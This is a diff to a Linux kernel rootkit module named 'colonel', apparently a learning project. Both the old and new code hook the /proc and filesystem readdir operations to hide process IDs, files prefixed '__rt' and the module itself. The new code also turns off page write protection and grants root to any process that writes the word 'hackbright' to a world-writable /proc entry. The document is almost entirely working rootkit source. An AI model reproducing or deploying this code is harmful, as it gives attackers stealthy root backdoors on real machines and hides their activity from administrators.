@@ -1,257 +1,280 @@
-/* Declaring everything static confines all variables and functions to the module (rootkit) --
- * they won't be exported to /proc/kallsyms. As a result, the rootkit is harder to detect. */
-
+#include <linux/init.h>
 #include <linux/module.h>
-#include <linux/kernel.h>
 #include <linux/proc_fs.h>
-#include <linux/sched.h>
-#include <linux/string.h>
+#include <linux/fs.h>
 #include <linux/cred.h>
-#include <linux/stat.h>
-#include <linux/uaccess.h>
-#include <linux/file.h>
+#include <linux/string.h>
 
-#include "rootkit.conf.h"
-
+#define MIN(a,b) \
+   ({ typeof (a) _a = (a); \
+      typeof (b) _b = (b); \
+     _a < _b ? _a : _b; })		/* typesafe macro for retrieving the min value */
+#define MAX_PIDS 50				/* the maximum number of hidden PIDs */
+      
 MODULE_LICENSE("GPL");
 
-static int failed;
-static char pid[10][32];
-static int pid_index;
+/* Declaring everything static confines all variables and functions to the module (rootkit) --
+ * i.e. no export to /proc/kallsyms making the rootkit harder to detect. */
 
-/* The following pointers save the original, replaced pointers.
- * They are retrieved during the module unload. */
-static int (*old_proc_readdir)(struct file *, void *, filldir_t);
-static filldir_t old_filldir;
-static ssize_t (*old_fops_write)(struct file *, const char __user *,
- 				size_t, loff_t *);
-static ssize_t (*old_fops_read)(struct file *, char __user *, size_t, loff_t *);
-static write_proc_t *old_write;
-static read_proc_t *old_read;
+/* STATIC VARIABLES */
+static struct proc_dir_entry *proc_root;
+static struct proc_dir_entry *proc_colonel;
 
-static struct proc_dir_entry *ptr; 			/* pointer to infected entry */
-static struct proc_dir_entry *root;			/* pointer to /proc directory */
-static struct list_head *prev;				/* pointer to the module entry that is above the rootkit
- 											 * in main modules list -- so we know where to put the 
- 											 * rootkit entry when shown */
-static struct file_operations *fops; 		/* file_operations of infected entry */
-static struct file_operations *root_fops;	/* file_operations of /proc */
+/* The following variables save the original, soon to be replaced, pointers.
+ * They are restored during the module unload. Names are self-explanatory. */
+static int (*og_proc_readdir)(struct file *, void *, filldir_t);
+static int (*og_fs_readdir)(struct file *, void *, filldir_t);
 
-static inline void module_remember_info(void) {
-	prev = THIS_MODULE->list.prev;
+static filldir_t og_proc_filldir;
+static filldir_t og_fs_filldir;
+
+static struct file_operations *proc_fops;
+static struct file_operations *fs_fops;
+
+/* pointer to the module entry that is above the rootkit in main module/kobject list -- 
+ * acts as a placeholder for where to place the rootkit entry when shown*/
+static struct list_head *prev_module;
+static struct list_head *prev_kobj_module;
+
+/* array used for hiding PIDs and their positions */
+static char hidden_pids[MAX_PIDS][8];
+static int current_pid = 0;
+
+/* switches for the module and hidden files */
+static char hidden_files = 1;
+static char hidden_module = 0;
+
+/* module status array */
+static char module_status[1024];
+
+/* MODULE FUNCTIONS */
+void hide_module(void) {
+	if (hidden_module) {							/* if already hidden, return with no error */
+		return;
+	}
+
+	prev_module = THIS_MODULE->list.prev;			/* stores rootkit entry */
+	list_del(&THIS_MODULE->list);					/* removes rootkit entry from modules list */
+
+	prev_kobj_module = THIS_MODULE->mkobj.kobj.entry.prev;	/* stores kobject */
+	kobject_del(&THIS_MODULE->mkobj.kobj);			/* removes kobjects */
+	list_del(&THIS_MODULE->mkobj.kobj.entry);
+
+	hidden_module = !hidden_module;					/* sets the module switch to 1 */
+}
+ 
+void show_module(void) {
+	int restore;
+
+	if (!hidden_module) {							/* if already showing, return with no error */
+		return;
+	}
+
+	list_add(&THIS_MODULE->list, prev_module);		/* restores module entry */
+
+	restore = kobject_add(&THIS_MODULE->mkobj.kobj, 	/* restores kobject */
+						 THIS_MODULE->mkobj.kobj.parent, "rt");
+	/* WTF */
+	hidden_module = !hidden_module;					/* resets module switch */
 }
 
-static inline void module_show(void) {
-	list_add(&THIS_MODULE->list, prev);		/* adds rootkit to main module list */
+/* PAGE READ/WRITE FUNCTIONS */ /* WTF */
+static void set_addr_rw(void *addr) {
+	unsigned int level;
+	pte_t *pte = lookup_address((unsigned long) addr, &level);	/* get what page the address is on */
+	if (pte->pte &~ _PAGE_RW) {
+		pte->pte |= _PAGE_RW;		/* set page read/write */
+	}
 }
 
-/* The parameter of the check_buf function is 
- * the pointer to the buffer that should hold commands */ 
-static int check_buf(const char __user *buf) {
-	struct cred *new = prepare_creds();			/* gain root privileges */
-	if (!strcmp(buf, password)) {
-		new->uid = new->euid = 0;
-		new->gid = new->egid = 0;
-		commit_creds(new);
+static void set_addr_ro(void *addr) {	/* resets to original permissions */
+	unsigned int level;
+	pte_t *pte = lookup_address((unsigned long) addr, &level);
+	pte->pte = pte->pte &~_PAGE_RW;
+}
 
-	} else if (!strcmp(buf, module_release)) {	/* allow rootkit to be unloaded with rmmod */
-		module_put(THIS_MODULE);
-
-	} else if (!strcmp(buf, module_uncover)) {	/* make the rootkit visible */
-		module_show();
-
-	} else if (!strncmp(buf, hide_proc, strlen(hide_proc))) {		/* hide rootkit process */
-		if (pid_index > 9) {
-			return 0;
+/* THE CUSTOM SHOP */
+/* Where the classics get a fresh look */
+static int new_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, 
+u64 ino, unsigned d_type) {
+	int i;
+	for (i=0; i < current_pid; i++) {
+		if (!strcmp(name, hidden_pids[i])) {
+			return 0;	/* ensures any matches to hidden PIDs aren't shown */
 		}
-		sprintf(pid[pid_index], "%s", buf+5);
-		pid_index++;
-	
-	} else if (!strncmp(buf, unhide_proc, strlen(unhide_proc))) {	/* show last hidden process */
-		if (!pid_index) {
-			return 0;
-		}
-		pid_index--;
+	}
 
+	if (!strcmp(name, "colonel")) {			
+		return 0;		/* ensures any matches to rootkit aren't shown */
+	}
+
+	return og_proc_filldir(buf, name, namelen, offset, ino, d_type);	/* invokes the original */
+}
+
+static int new_proc_readdir(struct file *filp, void *dirent, filldir_t filldir) {
+	og_proc_filldir = filldir; 					/* stores the original filldir */
+	return og_proc_readdir(filp, dirent, new_proc_filldir);		/* passes the modified function */
+}
+
+static int new_fs_filldir(void *buf, const char *name, int namelen, loff_t offset, 
+						  u64 ino, unsigned d_type) {
+	if (hidden_files && (!strncmp(name, "__rt", 4) || !strncmp(name, "10-__rt", 7))) {	/* hides the file if prefix matches */
+		return 0;
+	}
+	return og_fs_filldir(buf, name, namelen, offset, ino, d_type); /* invokes the original */
+}
+
+static int new_fs_readdir(struct file *filp, void *dirent, filldir_t filldir) {
+	og_fs_filldir = filldir;	/* comparable to the /proc version */
+	return og_fs_readdir(filp, dirent, new_fs_filldir);
+}
+
+static int read_colonel(char *buffer, char **buffer_location, off_t off, 
+					  int count, int *eof, void *data) {	/* reads /proc/colonel */
+	int size;
+
+	sprintf(module_status, 
+"colonel\n\
+DESCRIPTION:\n\
+  hides files prefixed with __rt or 10-__rt and gives root access\n\n\
+COMMANDS:\n\
+  hackbright  - uid and gid 0 for writing process\n\
+  hpXXXX 	  - hides process id XXXX\n\
+  sp 		  - shows last hidden process\n\
+  thf		  - toggles hidden files\n\
+  mh 		  - hide module\n\
+  ms 		  - show module\n\n\
+STATUS-------------------------------------------\n\
+  hidden files: %d\n\
+  hidden PIDs: %d\n\
+  hidden module: %d\n", hidden_files, current_pid, hidden_module);
+
+	size = strlen(module_status);
+/* WTF */
+	if (off >= size) {
+		return 0;
+	}
+  
+	if (count >= size-off) {
+		memcpy(buffer, module_status+off, size-off);
 	} else {
+		memcpy(buffer, module_status+off, count);
+	}
+  
+	return size-off;	/* starts at given offset */
+}
+
+/* listens and processes commands written to /proc/colonel
+ * write_colonel uses strncmp to compare input to colonel commands */
+static int write_colonel(struct file *file, const char __user *buff, unsigned long count, void *data) {
+	if (!strncmp(buff, "hackbright", MIN(10, count))) {	/* become root */
+		struct cred *credentials = prepare_creds();
+		credentials->uid = credentials->euid = 0;
+		credentials->gid = credentials->egid = 0;
+		commit_creds(credentials);
+
+	} else if (!strncmp(buff, "hp", MIN(2, count))) {		/* hides process id */
+		if (current_pid < MAX_PIDS) strncpy(hidden_pids[current_pid++], buff+2, MIN(7, count-2));
+
+	} else if (!strncmp(buff, "sp", MIN(2, count))) {		/* shows last hidden process */
+		if (current_pid > 0) current_pid--;
+
+	} else if (!strncmp(buff, "thf", MIN(3, count))) {		/*toggles hidden_files in fs */
+		hidden_files = !hidden_files;
+
+	} else if (!strncmp(buff, "mh", MIN(2, count))) {		/* hide module (rootkit) */
+		hide_module();
+
+	} else if (!strncmp(buff, "ms", MIN(2, count))) {		/* show module (rootkit) */
+		show_module();
+	}
+	
+    return count;
+}
+
+/* CLEAN/INIT FUNCTIONS */
+/* NULL checks for sanity */
+static void clean_procfs(void) {
+	if (proc_colonel != NULL) {
+		remove_proc_entry("colonel", NULL);		/* removes /proc/colonel */
+		proc_colonel = NULL;
+	}
+
+	if (proc_fops != NULL && og_proc_readdir != NULL) {
+		set_addr_rw(proc_fops);
+		proc_fops->readdir = og_proc_readdir;	/* restores the original /proc readdir */
+		set_addr_ro(proc_fops);
+	}
+}
+	
+static void clean_fs(void) {
+	if (fs_fops != NULL && og_fs_readdir != NULL) {
+		set_addr_rw(fs_fops);
+		fs_fops->readdir = og_fs_readdir;		/* restore original fs readdir */
+		set_addr_ro(fs_fops);
+	}
+}
+
+static int __init procfs_init(void) {
+	proc_colonel = create_proc_entry("colonel", 0666, NULL);	/* creates /proc/colonel in root */
+	if (proc_colonel == NULL) {
+		return 0;
+	}
+
+	proc_root = proc_colonel->parent;
+	if (proc_root == NULL || strcmp(proc_root->name, "/proc") != 0) {
+		return 0;
+	}
+
+	proc_colonel->read_proc = read_colonel;		/* sets custom read function */
+	proc_colonel->write_proc = write_colonel;	/* sets custom write function */
+	
+	/* WTF (using page mode change) */
+	proc_fops = ((struct file_operations *) proc_root->proc_fops);
+	og_proc_readdir = proc_fops->readdir;
+	set_addr_rw(proc_fops);
+	proc_fops->readdir = new_proc_readdir;	/* passes custom readdir */
+	set_addr_ro(proc_fops);
+	
+	return 1;
+}
+
+static int __init fs_init(void) {
+	struct file *etc_filp;
+	
+	etc_filp = filp_open("/etc", O_RDONLY, 0);	/* retrieves file_operations of /etc */
+	if (etc_filp == NULL) {
+		return 0;
+	}
+
+	fs_fops = (struct file_operations *) etc_filp->f_op;
+	filp_close(etc_filp, NULL);
+	
+	og_fs_readdir = fs_fops->readdir;
+	set_addr_rw(fs_fops);
+	fs_fops->readdir = new_fs_readdir;	/* passes custom readdir */ 
+	set_addr_ro(fs_fops);
+	
+	return 1;
+}
+
+
+/* MODULE INIT/EXIT */
+static int __init rootkit_init(void) {
+	if (!procfs_init() || !fs_init()) {
+		clean_procfs();
+		clean_fs();
 		return 1;
 	}
 
+	hide_module();
 	return 0;
-}										 
-
-/* Custom write function */
-static int buf_write(struct file *file, const char __user *buf, 
-					 unsigned long count, void *data) {
-	if (!check_buf(buf)) {						/* if check_buf return is 0 -- 
-												 * there was a command passed */
-		return count;
-	}
-	return old_write(file, buf, count, data);	/* otherwise execute the (original) 
-												 * write function normally */
 }
 
-/* Custom read function for read_proc field */
-static int buf_read(char __user *buf, char **start, off_t off, 
-					int count, int *eof, void *data) {
-	if (!check_buf(buf)) {								/* if check_buf return is 0 --
-														 * there was a command passed */
-		return count;
-	}
-	return old_read(buf, start, off, count, eof, data);	/* otherwise execute the (original) 
-														 * read function normally */
+static void __exit rootkit_exit(void) {
+	clean_procfs();
+	clean_fs();
 }
 
-/* Custom file_operations structure write function */
-static ssize_t fops_write(struct file *file, const char __user *buf_user,
-						  size_t count, loff_t *p) {
-	if (!check_buf(buf_user)) {
-		return count;
-	}
-	return old_fops_write(file, buf_user, count, p);
-}
-
-/* Custom file_operations structure read function */
-static ssize_t fops_read(struct file *file, char __user *buf_user,
-						 size_t count, loff_t *p) {
-	if (!check_buf(buf_user)) {
-		return count;
-	}
-	return old_fops_read(file, buf_user, count, p);
-}
-
-/* Custom filldir function */
-static int new_filldir(void *__buf, const char *name, int namelen,
-					   loff_t offset, u64 ino, unsigned d_type) {
-	int i;
-	for (i = 0; i < pid_index; i++) {
-		if (!strcmp(name, pid[i])) {
-			return 0;
-		}	
-	}
-	return old_filldir(__buf, name, namelen, offset, ino, d_type);
-}
-
-/* Custom readdir function */
-static int new_proc_readdir(struct file *filp, void *dirent, filldir_t filldir) {
-	old_filldir = filldir;								/* to invoke the original filldir in new_filldir */
-	return old_proc_readdir(filp, dirent, new_filldir);	/* invoke original readdir, but pass pointer to our filldir */
-}
-
-/* Replace /proc readdir function with rootkit custom readdir */
-static inline void change_proc_root_readdir(void) {
-	root_fops = (struct file_operations *)root->proc_fops;
-	old_proc_readdir = root_fops->readdir;
-	root_fops->readdir = new_proc_readdir;
-}
-
-static inline void proc_init(void) {
-	ptr = create_proc_entry("temporary", 0444, NULL);
-	ptr = ptr->parent;								/* ptr->parent was pointer to /proc --
-													 * if it's not, we've got problems */
-	if (strcmp(ptr->name, "/proc") != 0) {
-		failed = 1;
-		return;
-	}
-	root = ptr;
-	remove_proc_entry("temporary", NULL);
-	change_proc_root_readdir(); 					/* change the /proc readdir function */
-	ptr = ptr->subdir;
-
-	while (ptr) {									/* searching for entry to infect */
-		if (0 == strcmp(ptr->name, passwaiter)) {
-			goto found;								/* DING DING DING!!! we found it! */
-		}
-		ptr = ptr->next;							/* otherwise, on to the next entry */
-	}
-	failed = 1;
-	return;
-
-	found:
-
-		/* Save the original pointers -- these will be 
-		 * restored when rootkit is unloaded */
-		old_write = ptr->write_proc;
-		old_read = ptr->read_proc;
-
-		fops = (struct file_operations *)ptr->proc_fops;	/* pointer to file_operations structure 
-															 * of infected entry */
-		old_fops_read = fops->read;
-		old_fops_write = fops->write;
-
-		/* Replace write_proc/read_proc */
-		if (ptr->write_proc) {
-			ptr->write_proc = buf_write;
-		} else if (ptr->read_proc) {
-			ptr->read_proc = buf_read;
-		}
-
-		/* Replace read/write from file_operations */
-		if (fops->write) {
-			fops->write = fops_write;
-		} else if (fops->read) {
-			fops->read = fops_read;
-		}
-
-		/* Throw an error if there aren't any read/write functions */
-		if (!ptr->read_proc && !ptr->write_proc 
-			&& !fops->read && !fops->write) {
-			failed = 1;
-			return;
-		}
-}	
-
-/* The following function does some cleanups.
- * If some pointers aren't set to NULL,
- * Oops can occur when unloading the rootkit. 
- * Some structures are also freed to save memory. */
- static inline void tidy(void) {
- 	kfree(THIS_MODULE->notes_attrs);
- 	THIS_MODULE->notes_attrs = NULL;
- 	kfree(THIS_MODULE->sect_attrs);
- 	THIS_MODULE->sect_attrs = NULL;
- 	kfree(THIS_MODULE->mkobj.mp);
- 	THIS_MODULE->mkobj.mp = NULL;
- 	THIS_MODULE->modinfo_attrs->attr.name = NULL;
- 	kfree(THIS_MODULE->mkobj.drivers_dir);
- 	THIS_MODULE->mkobj.drivers_dir = NULL;
- }
-
- /* Delete some structures from lists to make the rootkit harder to detect */
- static inline void rootkit_hide(void) {
- 	list_del(&THIS_MODULE->list);
- 	kobject_del(&THIS_MODULE->mkobj.kobj);
- 	list_del(&THIS_MODULE->mkobj.kobj.entry);
- }
-
- static inline void rootkit_protect(void) {
- 	try_module_get(THIS_MODULE);
- }
-
- static int __init rootkit_init(void) {
- 	module_remember_info();
- 	proc_init();
- 	if (failed) {
- 		return 0;
- 	}
- 	rootkit_hide();
- 	tidy();
- 	// rootkit_protect();
-
- 	return 0;
- }
-
- static void __exit rootkit_exit(void) {
- 	if (failed) {							/* if failed, no cleanups are necessary */
- 		return;
- 	}
- 	root_fops->readdir = old_proc_readdir;
- 	fops->write = old_fops_write;
- 	fops->read = old_fops_read;
- 	ptr->write_proc = old_write;
- 	ptr->read_proc = old_read;
- }
-
-
- module_init(rootkit_init);
- module_exit(rootkit_exit);
+module_init(rootkit_init);
+module_exit(rootkit_exit);
